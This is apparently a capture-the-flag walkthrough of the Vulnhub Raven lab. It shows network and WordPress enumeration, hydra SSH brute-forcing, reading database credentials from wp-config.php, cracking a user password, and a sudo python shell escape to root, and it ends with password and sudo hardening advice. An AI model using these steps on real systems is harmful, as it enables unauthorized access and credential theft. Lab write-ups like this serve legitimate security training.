Do basic enumeration 

looking for active network : **command : netdiscover -r ip/24**

<img width="613" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/47747a40-9343-429a-a29f-51f33cbf90a4">

nmap scan : **Command: nmap -sC -sV -T4 -sS -vv iptarget**
here result that the ip raven have 3 open ports:

<img width="960" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/cda0d5aa-b6e7-4306-ab4e-6b8b31d3c14c">

do Directory enumeration: **Command: dirsearch -u iptarget/wordpress -e * -r 3**
nothing juicy information has alert.

go to wordpress enumeration , we will use wpscan:
**Command: wpscan --url iptarget -e u**

<img width="621" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/0aff31c1-3c72-4e57-8eba-cb40f6ac60ba">

we found : **steven** also **michael** users.

lets do bruteforce ssh with the users michael: **Command : hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://iptarget -t 4**

<img width="855" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/becab8df-be1b-46d4-bd4d-cf9b7fc0b3e8">

Login ssh with user michael@ip and password: michael

found config belong to wordpress credentials, these looks like mysql credential

atfirst visit to cd /var/www/html/wordpress

cat wp-config.php

<img width="814" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/a2731812-fd5b-4212-9081-f3b26ee78a37">

tried to loggin with those credential : **mysql -u root -p** 

<img width="957" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/28424e02-74f9-473e-a834-8d299154eacb">

we can cracking this hash with two methods with wpscan tools or with jhontheripper tools
i only simulated with wpscan tool to brute force the hash.

Cracking user steven with wpscan tools

**Command : wpscan --url raven.local -usernames steven -passwords /usr/share/wordlists/rockyou.txt**

<img width="708" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/5ee84fd3-b7e9-4677-81bf-120888c9125d">

Login ssh with users steven@ip password: **pink84**

<img width="571" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/0215bd7f-9503-4246-8dc8-aa395c20477f">

Privilage escalation :
sudo -l , **command: sudo python -c 'import os; os.system("/bin/sh")'**

<img width="458" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/5fa91bf1-2f1a-4337-bab4-c159c97ebae3">


**Recomendation**
```
1. Use strong password ,Set 8 digit minimum and combination with symbols.
2. Use different username and password each service will be used.
3. turn off privilege access for all application services that can be run via sudo, and make sure users can only access root with credentials such as a password or private key.
```
